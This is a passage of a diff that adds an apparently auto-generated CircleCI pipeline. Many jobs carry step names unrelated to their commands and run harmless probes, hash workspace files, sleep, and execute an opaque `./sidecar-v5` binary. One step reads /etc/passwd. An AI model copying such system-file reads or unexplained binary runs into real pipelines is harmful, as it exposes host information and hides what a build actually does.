+            dd if=/tmp/composer/vuj1 iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  ember_469:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: TODO ask Lucia about the api tier
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; [ -G ~ ] && echo ok || echo 'not ok'; true ; } > /tmp/composer/c4ny0n.cri5p.gr0v3
+            echo "nested: $(( $(wc -c </tmp/composer/c4ny0n.cri5p.gr0v3) + $(wc -l </tmp/composer/c4ny0n.cri5p.gr0v3) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'c4ny0n.cri5p.gr0v3'
+  fx-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/run7_8bec iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  onDataFade:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Please record the calibration beads
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; echo secret >"/tmp/carrot2022.10.08.dat" && shred -u "/tmp/carrot2022.10.08.dat" && ls "/tmp/carrot2022.10.08.dat" 2>/dev/null || echo shredded; true ; } > /tmp/composer/atoll-archive
+            echo "nested: $(( $(wc -c </tmp/composer/atoll-archive) + $(wc -l </tmp/composer/atoll-archive) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'atoll-archive'
+  dan-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/atoll-archive iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  md5Pulse:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: We try to proxy the CDN cache
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/Ginger-0726"/{rome,dublin,prague} && ls "/tmp/Ginger-0726"; true ; } > /tmp/composer/2016-08-11T14-40
+            echo "nested: $(( $(wc -c </tmp/composer/2016-08-11T14-40) + $(wc -l </tmp/composer/2016-08-11T14-40) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - '2016-08-11T14-40'
+  QA_MERGE_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/2016-08-11T14-40 iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  FBYBW-85471a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: All journal entries reviewed
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; enable|head -n 4; true ; } > /tmp/composer/access_20220316
+            echo "nested: $(( $(wc -c </tmp/composer/access_20220316) + $(wc -l </tmp/composer/access_20220316) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'access_20220316'
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/access_20220316 iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  copyFileLink:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Tune the sidebar
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; for p in shared bread dawn otter strategy; do echo $p | rev; done | wc -l; true ; } > /tmp/composer/MD5-Gamma
+            echo "nested: $(( $(wc -c </tmp/composer/MD5-Gamma) + $(wc -l </tmp/composer/MD5-Gamma) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'MD5-Gamma'
+  vela-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/run7_8bec iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  yolo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Maximise the search box
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; echo secret >"${TMPDIR:-/tmp}/edge.front.plum.list" && shred -u "${TMPDIR:-/tmp}/edge.front.plum.list" && ls "${TMPDIR:-/tmp}/edge.front.plum.list" 2>/dev/null || echo shredded; true ; } > /tmp/composer/R
+            echo "nested: $(( $(wc -c </tmp/composer/R) + $(wc -l </tmp/composer/R) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'R'
+  blast-off:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/run7_8bec iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+  Join-SrcItem:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: INT 7 unlock
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; echo 'yay!' | tee -a /tmp/th.txt >/dev/null && wc -l /tmp/th.txt; true ; } > /tmp/composer/bin-dat-tmp
+            echo "nested: $(( $(wc -c </tmp/composer/bin-dat-tmp) + $(wc -l </tmp/composer/bin-dat-tmp) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'bin-dat-tmp'
+  Prepare_Staging3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Log workspace
+          command: |
+            dd if=/tmp/composer/bin-dat-tmp iflag=count_bytes count=30 2>/dev/null | md5sum | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Decompress bundle
+          command: tar --extract -f main-docs-final.tar
+      - run:
+          name: Finalize build
+          command: /bin/sleep 30
+      - run:
+          command: free -m
+      - run:
+          name: Finalize build
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: (./sidecar-v5)
+
+  cOlive:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Text the front desk if that is ok
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; command ls -d /usr/bin/*grep*; true ; } > /tmp/composer/2016-08-11T14-40
+            echo "nested: $(( $(wc -c </tmp/composer/2016-08-11T14-40) + $(wc -l </tmp/composer/2016-08-11T14-40) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - '2016-08-11T14-40'
+  NewOption:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Last but not least tear down the pager rotation
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -type f -name '*lock*' -exec du -h {} \; 2> /dev/null | wc -l; true ; } > /tmp/composer/1c1e56b05ed
+            echo "nested: $(( $(wc -c </tmp/composer/1c1e56b05ed) + $(wc -l </tmp/composer/1c1e56b05ed) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - '1c1e56b05ed'
+  OPT_SPHERE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: welcome the referral bonuses NOW
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; printf '%s, ' split booking policy; echo; true ; } > /tmp/composer/tone_copper
+            echo "nested: $(( $(wc -c </tmp/composer/tone_copper) + $(wc -l </tmp/composer/tone_copper) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'tone_copper'
+  v_vs_y:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: versioning sha 979cfe
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; fallocate -l 4K "${TMPDIR:-/tmp}/bundle2018-12-01.dat" && ls -lh "${TMPDIR:-/tmp}/bundle2018-12-01.dat"; true ; } > /tmp/composer/14lN
+            echo "nested: $(( $(wc -c </tmp/composer/14lN) + $(wc -l </tmp/composer/14lN) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - '14lN'
+  IOS_Y:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Ask analytics to animate weapon stats
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; grep -s nobody /etc/passwd | awk -F: '{print $1}'; true ; } > /tmp/composer/05470bc0c254c0091338b14dcfed
+            echo "nested: $(( $(wc -c </tmp/composer/05470bc0c254c0091338b14dcfed) + $(wc -l </tmp/composer/05470bc0c254c0091338b14dcfed) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - '05470bc0c254c0091338b14dcfed'
+  yY:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Me measuring the socket pool
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; who -b; true ; } > /tmp/composer/bin-dat-tmp
+            echo "nested: $(( $(wc -c </tmp/composer/bin-dat-tmp) + $(wc -l </tmp/composer/bin-dat-tmp) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'bin-dat-tmp'
+  sdof27od8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: Split the download queue if that is ok
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; ls -A -s -X -r -F | head -6; true ; } > /tmp/composer/SKU-13799-QO
+            echo "nested: $(( $(wc -c </tmp/composer/SKU-13799-QO) + $(wc -l </tmp/composer/SKU-13799-QO) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'SKU-13799-QO'
+  nav-price-rounded:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: One quiet warning
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; for x in /etc/default/*;do printf '%s\n' "$x"; done | sort -r; true ; } > /tmp/composer/221.74
+            echo "nested: $(( $(wc -c </tmp/composer/221.74) + $(wc -l </tmp/composer/221.74) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - '221.74'
+  calender_tree:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/composer
+      - run:
+          name: 2023 resize
+          command: |
+            mkdir -p /tmp/composer
+            { set +o pipefail 2>/dev/null; printf 'winter\t16\npayment\t41\nright\t26\nplan\t57\n' >"/tmp/amber-outer-tmp.dat" && sort -k2 -n "/tmp/amber-outer-tmp.dat"; true ; } > /tmp/composer/DSC4798
+            echo "nested: $(( $(wc -c </tmp/composer/DSC4798) + $(wc -l </tmp/composer/DSC4798) ))"
+      - persist_to_workspace:
+          root: /tmp/composer
+          paths:
+            - 'DSC4798'
+workflows:
+  default:
+    jobs:
+      - FBYBW-85471a
+      - deploy:
+          requires:
+            - FBYBW-85471a
+      - map_revert:
+          requires:
+            - FBYBW-85471a
+      - alice-ship:
+          requires:
+            - map_revert
+      - bot4:
+          requires:
+            - map_revert
+      - refactor-4432:
+          requires:
+            - bot4
+      - onDataFade:
+          requires:
+            - bot4
+      - dan-push:
+          requires:
+            - onDataFade
+      - choosehidden:
+          requires:
+            - onDataFade
+      - produce-production-artifact-bundle:
+          requires:
+            - choosehidden
+      - bravoNovember6:
+          requires:
+            - choosehidden
+      - rm-login-reload:
+          requires:
+            - bravoNovember6
+      - UQ7:
+          requires:
+            - bravoNovember6
+      - bun-fmt:
+          requires:
+            - UQ7
+      - testSearchStackPublic:
+          requires:
+            - UQ7
+      - alpha-7:
+          requires:
+            - testSearchStackPublic
+      - BACKUP_RESOURCE_PIN_43:
+          requires:
+            - testSearchStackPublic
+      - java17-release:
+          requires:
+            - BACKUP_RESOURCE_PIN_43
+      - readComplexArticleAdapter
+      - copyFileLink
+      - dotnet8-build:
+          requires:
+            - readComplexArticleAdapter
+            - copyFileLink
+      - vela-rev:
+          requires:
+            - readComplexArticleAdapter
+            - copyFileLink
+      - publish:
+          requires:
+            - readComplexArticleAdapter
+            - copyFileLink
+      - APP-588:
+          requires:
+            - readComplexArticleAdapter
+            - copyFileLink
+      - q3-release:
+          requires:
+            - readComplexArticleAdapter
+            - copyFileLink
+      - fx-v2:
+          requires:
+            - readComplexArticleAdapter
+            - copyFileLink
+      - fix-8672:
+          requires:
+            - readComplexArticleAdapter
+            - copyFileLink
+      - verify:
+          requires:
+            - readComplexArticleAdapter
+            - copyFileLink
+      - PrepareImage:
+          requires:
+            - readComplexArticleAdapter
+            - copyFileLink
+      - DEV_INIT_8:
+          requires:
+            - readComplexArticleAdapter
+            - copyFileLink
+      - blast-off:
+          requires:
+            - readComplexArticleAdapter
+            - copyFileLink
+      - shippit:
+          requires:
+            - readComplexArticleAdapter
+            - copyFileLink
+      - md5Pulse
+      - cOlive:
+          requires:
+            - md5Pulse
+      - QA_MERGE_3:
+          requires:
+            - cOlive
+      - macro-star:
+          requires:
+            - cOlive
+      - NewOption:
+          requires:
+            - macro-star
+      - nightly-v8:
+          requires:
+            - NewOption
+      - inputEnabled:
+          requires:
+            - NewOption
+      - OPT_SPHERE:
+          requires:
+            - inputEnabled
+      - chen-build:
+          requires:
+            - OPT_SPHERE
+      - rollbackchoose:
+          requires:
+            - OPT_SPHERE
+      - v_vs_y:
+          requires:
+            - rollbackchoose
+      - Package_App3:
+          requires:
+            - v_vs_y
+      - Unlock-OptionInfo:
+          requires:
+            - v_vs_y
+      - IOS_Y:
+          requires:
+            - Unlock-OptionInfo
+      - CHECK_STG:
+          requires:
+            - IOS_Y
+      - Join-SrcItem:
+          requires:
+            - IOS_Y
+      - yY:
+          requires:
+            - Join-SrcItem
+      - Prepare_Staging3:
+          requires:
+            - yY
+      - testLoadUser:
+          requires:
+            - yY
+      - sdof27od8:
+          requires:
+            - testLoadUser
+      - fix-2785:
+          requires:
+            - sdof27od8
+      - status_arc:
+          requires:
+            - sdof27od8
+      - nav-price-rounded:
+          requires:
+            - status_arc
+      - package:
+          requires:
+            - nav-price-rounded
+      - ww:
+          requires:
+            - nav-price-rounded
+      - calender_tree:
+          requires:
+            - ww
+      - omar-test:
+          requires:
+            - calender_tree
